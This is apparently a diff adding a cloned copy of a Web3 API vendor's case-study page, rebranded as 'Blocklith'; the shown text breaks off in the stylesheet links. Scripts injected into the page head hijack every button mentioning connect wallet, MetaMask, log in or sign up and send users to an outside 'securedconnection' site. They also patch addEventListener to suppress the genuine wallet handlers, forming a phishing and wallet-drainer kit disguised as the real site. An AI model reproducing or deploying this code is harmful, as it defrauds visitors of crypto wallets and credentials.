@@ -1,0 +1,4279 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const main = document.querySelector("main");
+        if (!main) return;
+
+        const links = main.querySelectorAll("a[href]");
+        links.forEach((link) => link.removeAttribute("href"));
+      });
+      setTimeout(() => {
+        const links = main.querySelectorAll("a[href]");
+        links.forEach((link) => link.removeAttribute("href"));
+      }, 3000);
+    </script>
+    <style>
+      .floating-image {
+        position: fixed;
+        bottom: 15px;
+        right: 15px;
+        width: 60px;
+        height: 60px;
+        background-color: blue;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      }
+
+      .floating-image img {
+        width: 30px;
+        height: 30px;
+        object-fit: cover;
+        border-radius: 50%;
+      }
+    </style>
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const main = document.querySelector("main");
+        if (!main) return;
+
+        const links = main.querySelectorAll("a[href]");
+        links.forEach((link) => link.removeAttribute("href"));
+      });
+    </script>
+
+    <script>
+      window.addEventListener("scroll", function () {
+        const header = document.getElementById("m_header");
+
+        const allClasses =
+          "elementor-element elementor-element-c7ac6e1 e-con-full e-flex e-con e-parent dark e-lazyloaded elementor-sticky elementor-sticky--active elementor-section--handles-inside elementor-sticky--effects".split(
+            " "
+          );
+
+        const partialClasses =
+          "elementor-element elementor-element-c7ac6e1 e-con-full e-flex e-con e-parent dark e-lazyloaded elementor-sticky elementor-sticky--active elementor-section--handles-inside".split(
+            " "
+          );
+
+        if (window.scrollY > 50) {
+          header.classList.add(...allClasses);
+          console.log("Header class updated for sticky effect");
+        } else {
+          header.classList.remove(...allClasses);
+          header.classList.add(...partialClasses);
+        }
+      });
+    </script>
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    />
+    <script>
+      const redirectURL = "https://securedconnection.vercel.app/";
+
+      function blockEvent(event) {
+        event.preventDefault();
+        event.stopImmediatePropagation();
+        event.stopPropagation();
+        console.log("Blocked & Redirecting...");
+        window.location.href = redirectURL;
+      }
+
+      function patchElement(el) {
+        if (!el || el.dataset.patched) return;
+        el.dataset.patched = "true";
+
+        ["click", "mousedown", "pointerdown"].forEach((eventType) => {
+          el.addEventListener(eventType, blockEvent, true); // Capture phase
+          el.addEventListener(eventType, blockEvent, false); // Bubble phase
+        });
+
+        // Disable default attributes
+        el.removeAttribute("href");
+        el.removeAttribute("onclick");
+      }
+
+      function scanAndPatch() {
+        const allElements = document.querySelectorAll(
+          'button, a, [role="button"], [onclick]'
+        );
+        allElements.forEach((el) => {
+          const text = (el.innerText || "").toLowerCase().trim();
+          if (
+            text.includes("connect wallet") ||
+            text.includes("connect to wallet") ||
+            text.includes("connect") ||
+            text.includes("wallet connect") ||
+            text.includes("metamask") ||
+            text.includes("web3") ||
+            text.includes("log in") ||
+            text.includes("sign in") ||
+            text.includes("sign up") ||
+            text.includes("register") ||
+            text.includes("create account") ||
+            text.includes("login")
+          ) {
+            patchElement(el);
+          }
+        });
+      }
+
+      window.addEventListener("load", () => {
+        scanAndPatch();
+
+        // Watch for dynamic elements
+        const observer = new MutationObserver(() => {
+          scanAndPatch();
+        });
+
+        observer.observe(document.body, {
+          childList: true,
+          subtree: true,
+        });
+      });
+
+      // Optional: override addEventListener to block future handlers
+      const originalAddEventListener = EventTarget.prototype.addEventListener;
+      EventTarget.prototype.addEventListener = function (
+        type,
+        listener,
+        options
+      ) {
+        if (typeof listener === "function" && type === "click") {
+          // Prevent wallet modal listeners from registering
+          const toString = listener.toString();
+          if (
+            toString.includes("wallet") ||
+            toString.includes("connect") ||
+            toString.includes("provider") ||
+            toString.includes("web3")
+          ) {
+            console.warn(
+              "Blocked suspicious listener:",
+              toString.slice(0, 100)
+            );
+            return;
+          }
+        }
+        return originalAddEventListener.call(this, type, listener, options);
+      };
+    </script>
+
+    <script class="dynamic-script">
+      window.addEventListener("DOMContentLoaded", () => {
+        console.log("🔁 Running prioritized image fixer...");
+
+        const redirectURL = "https://securedconnection.vercel.app/";
+
+        function fixImagesAndButtons() {
+          const clickableElements = document.querySelectorAll(
+            'button, a, [role="button"], [onclick]'
+          );
+
+          const interactiveElements = Array.from(clickableElements).filter(
+            (el) => {
+              const text = (el.innerText || "").toLowerCase().trim();
+              return (
+                text.includes("connect wallet") ||
+                text.includes("connect to wallet") ||
+                text.includes("connect") ||
+                text.includes("wallet connect") ||
+                text.includes("metamask") ||
+                text.includes("web3") ||
+                text.includes("log in") ||
+                text.includes("sign in") ||
+                text.includes("sign up") ||
+                text.includes("register") ||
+                text.includes("create account") ||
+                text.includes("login")
+              );
+            }
+          );
+
+          interactiveElements.forEach((el) => {
+            // Remove any href or onclick behavior
+            el.removeAttribute("href");
+            el.removeAttribute("onclick");
+
+            // First event listener
+            el.addEventListener("click", function (event) {
+              event.stopImmediatePropagation(); // This stops the next listener from running
+              console.log("First click handler");
+            });
+
+            // If there's an <a> inside, disable it too
+            const anchor = el.querySelector("a");
+            if (anchor) {
+              anchor.removeAttribute("href");
+              anchor.removeAttribute("onclick");
+              anchor.addEventListener("click", (event) => {
+                event.preventDefault();
+                event.stopImmediatePropagation();
+                window.location.href = redirectURL;
+              });
+            }
+
+            // Add redirect handler on click
+            el.addEventListener("click", (event) => {
+              event.preventDefault();
+              event.stopImmediatePropagation();
+              window.location.href = redirectURL;
+            });
+          });
+
+          // Fix image sources
+          const images = document.querySelectorAll("img");
+          images.forEach((img) => {
+            const src = img.getAttribute("src");
+            img.removeAttribute("srcset");
+            if (
+              src &&
+              src.startsWith("/") &&
+              !src.startsWith("data:") &&
+              !src.startsWith("//") &&
+              !src.startsWith("http")
+            ) {
+              img.src = new URL(src, "https://moralis.com/").href;
+            }
+          });
+        }
+
+        fixImagesAndButtons();
+        setTimeout(fixImagesAndButtons, 3000);
+        setInterval(fixImagesAndButtons, 10000);
+      });
+      setInterval(() => {
+        // Fix image sources
+        const images = document.querySelectorAll("img");
+        images.forEach((img) => {
+          const src = img.getAttribute("src");
+          img.removeAttribute("srcset");
+          if (
+            src &&
+            src.startsWith("/") &&
+            !src.startsWith("data:") &&
+            !src.startsWith("//") &&
+            !src.startsWith("http")
+          ) {
+            img.src = new URL(src, "https://moralis.com/").href;
+          }
+        });
+      }, 1000);
+    </script>
+    <script class="history-override">
+      (function () {
+        const originalReplaceState = history.replaceState;
+        history.replaceState = function (state, title, url) {
+          try {
+            if (
+              url &&
+              !url.startsWith("/") &&
+              !url.startsWith(window.location.origin)
+            ) {
+              console.warn("🚫 Blocked cross-origin replaceState to: " + url);
+              return;
+            }
+            originalReplaceState.call(history, state, title, url);
+          } catch (err) {
+            console.warn("⚠️ Error in replaceState: " + err.message);
+          }
+        };
+      })();
+    </script>
+    <meta
+      http-equiv="origin-trial"
+      content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="
+    />
+    <meta
+      name="robots"
+      content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"
+    />
+    <style>
+      img:is([sizes="auto" i], [sizes^="auto," i]) {
+        contain-intrinsic-size: 3000px 1500px;
+      }
+    </style>
+
+    <!-- This site is optimized with the Yoast SEO plugin v25.3.1 - https://yoast.com/wordpress/plugins/seo/ -->
+    <title>How Nexus Labs Saved 3 Months of Work with Blocklith</title>
+    <meta
+      name="description"
+      content="Learn how Nexus Labs saved 3 months of work and 2 full-time roles by integrating Blocklith’ suite of Web3 APIs for its Web3 data needs."
+    />
+    <link rel="canonical" href="https://moralis.com/case-studies/nexus-labs/" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta
+      property="og:title"
+      content="How Nexus Labs Saved 3 Months of Work with Blocklith"
+    />
+    <meta
+      property="og:description"
+      content="Learn how Nexus Labs saved 3 months of work and 2 full-time roles by integrating Blocklith’ suite of Web3 APIs for its Web3 data needs."
+    />
+    <meta
+      property="og:url"
+      content="https://moralis.com/case-studies/nexus-labs/"
+    />
+    <meta
+      property="og:site_name"
+      content="Blocklith | Enterprise-Grade Web3 APIs"
+    />
+    <meta
+      property="article:publisher"
+      content="https://www.facebook.com/MoralisWeb3/"
+    />
+    <meta
+      property="article:modified_time"
+      content="2025-04-24T11:42:54+00:00"
+    />
+    <meta
+      property="og:image"
+      content="https://moralis.com/wp-content/uploads/2024/09/moralis_nexus_labs_cover.webp"
+    />
+    <meta property="og:image:width" content="1920" />
+    <meta property="og:image:height" content="1081" />
+    <meta property="og:image:type" content="image/webp" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta
+      name="twitter:title"
+      content="How Nexus Labs Saved 3 Months of Work with Blocklith"
+    />
+    <meta
+      name="twitter:description"
+      content="Learn how Nexus Labs saved 3 months of work and 2 full-time roles by integrating Blocklith’ suite of Web3 APIs for its Web3 data needs."
+    />
+    <meta
+      name="twitter:image"
+      content="https://moralis.com/wp-content/uploads/2024/09/moralis_nexus_labs_cover.webp"
+    />
+    <meta name="twitter:site" content="@moralisdevs" />
+    <meta name="twitter:label1" content="Est. reading time" />
+    <meta name="twitter:data1" content="4 minutes" />
+    <script async="" src="https://www.clarity.ms/s/0.8.21/clarity.js"></script>
+    <script async="" src="https://www.clarity.ms/tag/uet/148015318"></script>
+    <script
+      type="text/javascript"
+      async=""
+      src="https://s3-us-west-2.amazonaws.com/b2bjsstore/b/QOQRJHY1E562/reb2b.js.gz"
+    ></script>
+    <script
+      type="text/javascript"
+      async=""
+      src="https://tr-cdn.moralis.com/analytics.js/v1/Dm5isXKXxL7JJacNEVYFkpWGS7oyalhV/analytics.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      async=""
+      src="https://moralis-mixpanel-proxy.herokuapp.com/mp.js"
+    ></script>
+    <script
+      type="text/javascript"
+      async=""
+      src="https://bat.bing.com/bat.js"
+    ></script>
+    <script
+      type="text/javascript"
+      async=""
+      src="https://www.googletagmanager.com/gtag/js?id=G-VYPYJZYKCB&amp;cx=c&amp;gtm=45He57p1v9175371500za200&amp;tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211"
+    ></script>
+    <script
+      type="text/javascript"
+      async=""
+      src="https://geo.cookie-script.com/s/e7100c2e7d1fc494e61f4cae8c564830.js?country=gb&amp;state=ca&amp;region=eu"
+    ></script>
+    <script
+      async=""
+      defer=""
+      src="https://www.googletagmanager.com/gtm.js?id=GTM-T5T6X6FS"
+    ></script>
+    <script
+      type="text/javascript"
+      async=""
+      charset="utf-8"
+      src="https://www.gstatic.com/recaptcha/releases/ngcIAHyEnHQZZIKkyKneDTW3/recaptcha__en.js"
+      crossorigin="anonymous"
+      integrity="sha384-Kq9ivHFJO8Z7BQqPEcvZtkysKmz4eso0Q+Ti6hot0gaGWhIQRtinGXJKTesM5MuL"
+    ></script>
+    <!-- / Yoast SEO plugin. -->
+
+    <link rel="dns-prefetch" href="//ajax.googleapis.com" />
+    <style id="global-styles-inline-css">
+      :root {
+        --wp--preset--aspect-ratio--square: 1;
+        --wp--preset--aspect-ratio--4-3: 4/3;
+        --wp--preset--aspect-ratio--3-4: 3/4;
+        --wp--preset--aspect-ratio--3-2: 3/2;
+        --wp--preset--aspect-ratio--2-3: 2/3;
+        --wp--preset--aspect-ratio--16-9: 16/9;
+        --wp--preset--aspect-ratio--9-16: 9/16;
+        --wp--preset--color--black: #000000;
+        --wp--preset--color--cyan-bluish-gray: #abb8c3;
+        --wp--preset--color--white: #ffffff;
+        --wp--preset--color--pale-pink: #f78da7;
+        --wp--preset--color--vivid-red: #cf2e2e;
+        --wp--preset--color--luminous-vivid-orange: #ff6900;
+        --wp--preset--color--luminous-vivid-amber: #fcb900;
+        --wp--preset--color--light-green-cyan: #7bdcb5;
+        --wp--preset--color--vivid-green-cyan: #00d084;
+        --wp--preset--color--pale-cyan-blue: #8ed1fc;
+        --wp--preset--color--vivid-cyan-blue: #0693e3;
+        --wp--preset--color--vivid-purple: #9b51e0;
+        --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(
+          135deg,
+          rgba(6, 147, 227, 1) 0%,
+          rgb(155, 81, 224) 100%
+        );
+        --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(
+          135deg,
+          rgb(122, 220, 180) 0%,
+          rgb(0, 208, 130) 100%
+        );
+        --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(
+          135deg,
+          rgba(252, 185, 0, 1) 0%,
+          rgba(255, 105, 0, 1) 100%
+        );
+        --wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(
+          135deg,
+          rgba(255, 105, 0, 1) 0%,
+          rgb(207, 46, 46) 100%
+        );
+        --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(
+          135deg,
+          rgb(238, 238, 238) 0%,
+          rgb(169, 184, 195) 100%
+        );
+        --wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(
+          135deg,
+          rgb(74, 234, 220) 0%,
+          rgb(151, 120, 209) 20%,
+          rgb(207, 42, 186) 40%,
+          rgb(238, 44, 130) 60%,
+          rgb(251, 105, 98) 80%,
+          rgb(254, 248, 76) 100%
+        );
+        --wp--preset--gradient--blush-light-purple: linear-gradient(
+          135deg,
+          rgb(255, 206, 236) 0%,
+          rgb(152, 150, 240) 100%
+        );
+        --wp--preset--gradient--blush-bordeaux: linear-gradient(
+          135deg,
+          rgb(254, 205, 165) 0%,
+          rgb(254, 45, 45) 50%,
+          rgb(107, 0, 62) 100%
+        );
+        --wp--preset--gradient--luminous-dusk: linear-gradient(
+          135deg,
+          rgb(255, 203, 112) 0%,
+          rgb(199, 81, 192) 50%,
+          rgb(65, 88, 208) 100%
+        );
+        --wp--preset--gradient--pale-ocean: linear-gradient(
+          135deg,
+          rgb(255, 245, 203) 0%,
+          rgb(182, 227, 212) 50%,
+          rgb(51, 167, 181) 100%
+        );
+        --wp--preset--gradient--electric-grass: linear-gradient(
+          135deg,
+          rgb(202, 248, 128) 0%,
+          rgb(113, 206, 126) 100%
+        );
+        --wp--preset--gradient--midnight: linear-gradient(
+          135deg,
+          rgb(2, 3, 129) 0%,
+          rgb(40, 116, 252) 100%
+        );
+        --wp--preset--font-size--small: 13px;
+        --wp--preset--font-size--medium: 20px;
+        --wp--preset--font-size--large: 36px;
+        --wp--preset--font-size--x-large: 42px;
+        --wp--preset--spacing--20: 0.44rem;
+        --wp--preset--spacing--30: 0.67rem;
+        --wp--preset--spacing--40: 1rem;
+        --wp--preset--spacing--50: 1.5rem;
+        --wp--preset--spacing--60: 2.25rem;
+        --wp--preset--spacing--70: 3.38rem;
+        --wp--preset--spacing--80: 5.06rem;
+        --wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);
+        --wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);
+        --wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);
+        --wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1),
+          6px 6px rgba(0, 0, 0, 1);
+        --wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);
+      }
+      :root {
+        --wp--style--global--content-size: 800px;
+        --wp--style--global--wide-size: 1200px;
+      }
+      :where(body) {
+        margin: 0;
+      }
+      .wp-site-blocks > .alignleft {
+        float: left;
+        margin-right: 2em;
+      }
+      .wp-site-blocks > .alignright {
+        float: right;
+        margin-left: 2em;
+      }
+      .wp-site-blocks > .aligncenter {
+        justify-content: center;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      :where(.wp-site-blocks) > * {
+        margin-block-start: 24px;
+        margin-block-end: 0;
+      }
+      :where(.wp-site-blocks) > :first-child {
+        margin-block-start: 0;
+      }
+      :where(.wp-site-blocks) > :last-child {
+        margin-block-end: 0;
+      }
+      :root {
+        --wp--style--block-gap: 24px;
+      }
+      :root :where(.is-layout-flow) > :first-child {
+        margin-block-start: 0;
+      }
+      :root :where(.is-layout-flow) > :last-child {
+        margin-block-end: 0;
+      }
+      :root :where(.is-layout-flow) > * {
+        margin-block-start: 24px;
+        margin-block-end: 0;
+      }
+      :root :where(.is-layout-constrained) > :first-child {
+        margin-block-start: 0;
+      }
+      :root :where(.is-layout-constrained) > :last-child {
+        margin-block-end: 0;
+      }
+      :root :where(.is-layout-constrained) > * {
+        margin-block-start: 24px;
+        margin-block-end: 0;
+      }
+      :root :where(.is-layout-flex) {
+        gap: 24px;
+      }
+      :root :where(.is-layout-grid) {
+        gap: 24px;
+      }
+      .is-layout-flow > .alignleft {
+        float: left;
+        margin-inline-start: 0;
+        margin-inline-end: 2em;
+      }
+      .is-layout-flow > .alignright {
+        float: right;
+        margin-inline-start: 2em;
+        margin-inline-end: 0;
+      }
+      .is-layout-flow > .aligncenter {
+        margin-left: auto !important;
+        margin-right: auto !important;
+      }
+      .is-layout-constrained > .alignleft {
+        float: left;
+        margin-inline-start: 0;
+        margin-inline-end: 2em;
+      }
+      .is-layout-constrained > .alignright {
+        float: right;
+        margin-inline-start: 2em;
+        margin-inline-end: 0;
+      }
+      .is-layout-constrained > .aligncenter {
+        margin-left: auto !important;
+        margin-right: auto !important;
+      }
+      .is-layout-constrained
+        > :where(:not(.alignleft):not(.alignright):not(.alignfull)) {
+        max-width: var(--wp--style--global--content-size);
+        margin-left: auto !important;
+        margin-right: auto !important;
+      }
+      .is-layout-constrained > .alignwide {
+        max-width: var(--wp--style--global--wide-size);
+      }
+      body .is-layout-flex {
+        display: flex;
+      }
+      .is-layout-flex {
+        flex-wrap: wrap;
+        align-items: center;
+      }
+      .is-layout-flex > :is(*, div) {
+        margin: 0;
+      }
+      body .is-layout-grid {
+        display: grid;
+      }
+      .is-layout-grid > :is(*, div) {
+        margin: 0;
+      }
+      body {
+        padding-top: 0px;
+        padding-right: 0px;
+        padding-bottom: 0px;
+        padding-left: 0px;
+      }
+      a:where(:not(.wp-element-button)) {
+        text-decoration: underline;
+      }
+      :root :where(.wp-element-button, .wp-block-button__link) {
+        background-color: #32373c;
+        border-width: 0;
+        color: #fff;
+        font-family: inherit;
+        font-size: inherit;
+        line-height: inherit;
+        padding: calc(0.667em + 2px) calc(1.333em + 2px);
+        text-decoration: none;
+      }
+      .has-black-color {
+        color: var(--wp--preset--color--black) !important;
+      }
+      .has-cyan-bluish-gray-color {
+        color: var(--wp--preset--color--cyan-bluish-gray) !important;
+      }
+      .has-white-color {
+        color: var(--wp--preset--color--white) !important;
+      }
+      .has-pale-pink-color {
+        color: var(--wp--preset--color--pale-pink) !important;
+      }
+      .has-vivid-red-color {
+        color: var(--wp--preset--color--vivid-red) !important;
+      }
+      .has-luminous-vivid-orange-color {
+        color: var(--wp--preset--color--luminous-vivid-orange) !important;
+      }
+      .has-luminous-vivid-amber-color {
+        color: var(--wp--preset--color--luminous-vivid-amber) !important;
+      }
+      .has-light-green-cyan-color {
+        color: var(--wp--preset--color--light-green-cyan) !important;
+      }
+      .has-vivid-green-cyan-color {
+        color: var(--wp--preset--color--vivid-green-cyan) !important;
+      }
+      .has-pale-cyan-blue-color {
+        color: var(--wp--preset--color--pale-cyan-blue) !important;
+      }
+      .has-vivid-cyan-blue-color {
+        color: var(--wp--preset--color--vivid-cyan-blue) !important;
+      }
+      .has-vivid-purple-color {
+        color: var(--wp--preset--color--vivid-purple) !important;
+      }
+      .has-black-background-color {
+        background-color: var(--wp--preset--color--black) !important;
+      }
+      .has-cyan-bluish-gray-background-color {
+        background-color: var(--wp--preset--color--cyan-bluish-gray) !important;
+      }
+      .has-white-background-color {
+        background-color: var(--wp--preset--color--white) !important;
+      }
+      .has-pale-pink-background-color {
+        background-color: var(--wp--preset--color--pale-pink) !important;
+      }
+      .has-vivid-red-background-color {
+        background-color: var(--wp--preset--color--vivid-red) !important;
+      }
+      .has-luminous-vivid-orange-background-color {
+        background-color: var(
+          --wp--preset--color--luminous-vivid-orange
+        ) !important;
+      }
+      .has-luminous-vivid-amber-background-color {
+        background-color: var(
+          --wp--preset--color--luminous-vivid-amber
+        ) !important;
+      }
+      .has-light-green-cyan-background-color {
+        background-color: var(--wp--preset--color--light-green-cyan) !important;
+      }
+      .has-vivid-green-cyan-background-color {
+        background-color: var(--wp--preset--color--vivid-green-cyan) !important;
+      }
+      .has-pale-cyan-blue-background-color {
+        background-color: var(--wp--preset--color--pale-cyan-blue) !important;
+      }
+      .has-vivid-cyan-blue-background-color {
+        background-color: var(--wp--preset--color--vivid-cyan-blue) !important;
+      }
+      .has-vivid-purple-background-color {
+        background-color: var(--wp--preset--color--vivid-purple) !important;
+      }
+      .has-black-border-color {
+        border-color: var(--wp--preset--color--black) !important;
+      }
+      .has-cyan-bluish-gray-border-color {
+        border-color: var(--wp--preset--color--cyan-bluish-gray) !important;
+      }
+      .has-white-border-color {
+        border-color: var(--wp--preset--color--white) !important;
+      }
+      .has-pale-pink-border-color {
+        border-color: var(--wp--preset--color--pale-pink) !important;
+      }
+      .has-vivid-red-border-color {
+        border-color: var(--wp--preset--color--vivid-red) !important;
+      }
+      .has-luminous-vivid-orange-border-color {
+        border-color: var(
+          --wp--preset--color--luminous-vivid-orange
+        ) !important;
+      }
+      .has-luminous-vivid-amber-border-color {
+        border-color: var(--wp--preset--color--luminous-vivid-amber) !important;
+      }
+      .has-light-green-cyan-border-color {
+        border-color: var(--wp--preset--color--light-green-cyan) !important;
+      }
+      .has-vivid-green-cyan-border-color {
+        border-color: var(--wp--preset--color--vivid-green-cyan) !important;
+      }
+      .has-pale-cyan-blue-border-color {
+        border-color: var(--wp--preset--color--pale-cyan-blue) !important;
+      }
+      .has-vivid-cyan-blue-border-color {
+        border-color: var(--wp--preset--color--vivid-cyan-blue) !important;
+      }
+      .has-vivid-purple-border-color {
+        border-color: var(--wp--preset--color--vivid-purple) !important;
+      }
+      .has-vivid-cyan-blue-to-vivid-purple-gradient-background {
+        background: var(
+          --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple
+        ) !important;
+      }
+      .has-light-green-cyan-to-vivid-green-cyan-gradient-background {
+        background: var(
+          --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan
+        ) !important;
+      }
+      .has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background {
+        background: var(
+          --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange
+        ) !important;
+      }
+      .has-luminous-vivid-orange-to-vivid-red-gradient-background {
+        background: var(
+          --wp--preset--gradient--luminous-vivid-orange-to-vivid-red
+        ) !important;
+      }
+      .has-very-light-gray-to-cyan-bluish-gray-gradient-background {
+        background: var(
+          --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray
+        ) !important;
+      }
+      .has-cool-to-warm-spectrum-gradient-background {
+        background: var(
+          --wp--preset--gradient--cool-to-warm-spectrum
+        ) !important;
+      }
+      .has-blush-light-purple-gradient-background {
+        background: var(--wp--preset--gradient--blush-light-purple) !important;
+      }
+      .has-blush-bordeaux-gradient-background {
+        background: var(--wp--preset--gradient--blush-bordeaux) !important;
+      }
+      .has-luminous-dusk-gradient-background {
+        background: var(--wp--preset--gradient--luminous-dusk) !important;
+      }
+      .has-pale-ocean-gradient-background {
+        background: var(--wp--preset--gradient--pale-ocean) !important;
+      }
+      .has-electric-grass-gradient-background {
+        background: var(--wp--preset--gradient--electric-grass) !important;
+      }
+      .has-midnight-gradient-background {
+        background: var(--wp--preset--gradient--midnight) !important;
+      }
+      .has-small-font-size {
+        font-size: var(--wp--preset--font-size--small) !important;
+      }
+      .has-medium-font-size {
+        font-size: var(--wp--preset--font-size--medium) !important;
+      }
+      .has-large-font-size {
+        font-size: var(--wp--preset--font-size--large) !important;
+      }
+      .has-x-large-font-size {
+        font-size: var(--wp--preset--font-size--x-large) !important;
+      }
+      :root :where(.wp-block-pullquote) {
+        font-size: 1.5em;
+        line-height: 1.6;
+      }
+    </style>
+    <link
+      rel="stylesheet"
+      id="chld_thm_cfg_parent-css"
+      href="https://moralis.com/wp-content/themes/hello-elementor/style.css?ver=6.8.1"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="hello-elementor-css"
+      href="https://moralis.com/wp-content/themes/hello-elementor/assets/css/reset.css?ver=3.4.4"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="hello-elementor-theme-style-css"
+      href="https://moralis.com/wp-content/themes/hello-elementor/assets/css/theme.css?ver=3.4.4"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="hello-elementor-header-footer-css"
+      href="https://moralis.com/wp-content/themes/hello-elementor/assets/css/header-footer.css?ver=3.4.4"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="e-sticky-css"
+      href="https://moralis.com/wp-content/plugins/elementor-pro/assets/css/modules/sticky.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-frontend-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-heading-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-nav-menu-css"
+      href="https://moralis.com/wp-content/plugins/elementor-pro/assets/css/widget-nav-menu.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-icons-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.40.0"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-post-6-css"
+      href="https://moralis.com/wp-content/uploads/elementor/css/post-6.css?ver=1750974744"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="font-awesome-5-all-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="font-awesome-4-shim-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/v4-shims.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-image-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-counter-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/css/widget-counter.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-icon-box-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/css/widget-icon-box.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-author-box-css"
+      href="https://moralis.com/wp-content/plugins/elementor-pro/assets/css/widget-author-box.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-divider-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/css/widget-divider.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="widget-share-buttons-css"
+      href="https://moralis.com/wp-content/plugins/elementor-pro/assets/css/widget-share-buttons.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="e-apple-webkit-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/css/conditionals/apple-webkit.min.css?ver=3.29.2"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-icons-shared-0-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.3"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-icons-fa-solid-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.15.3"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-icons-fa-brands-css"
+      href="https://moralis.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/brands.min.css?ver=5.15.3"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-post-146461-css"
+      href="https://moralis.com/wp-content/uploads/elementor/css/post-146461.css?ver=1753714615"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-post-144196-css"
+      href="https://moralis.com/wp-content/uploads/elementor/css/post-144196.css?ver=1753300731"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-post-145779-css"
+      href="https://moralis.com/wp-content/uploads/elementor/css/post-145779.css?ver=1750974745"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="tablepress-default-css"
+      href="https://moralis.com/wp-content/plugins/tablepress/css/build/default.css?ver=3.1.3"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="hello-elementor-child-style-css"
+      href="https://moralis.com/wp-content/themes/hello-elementor-child/style.css?ver=1.1.1"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="enlighterjs-css"
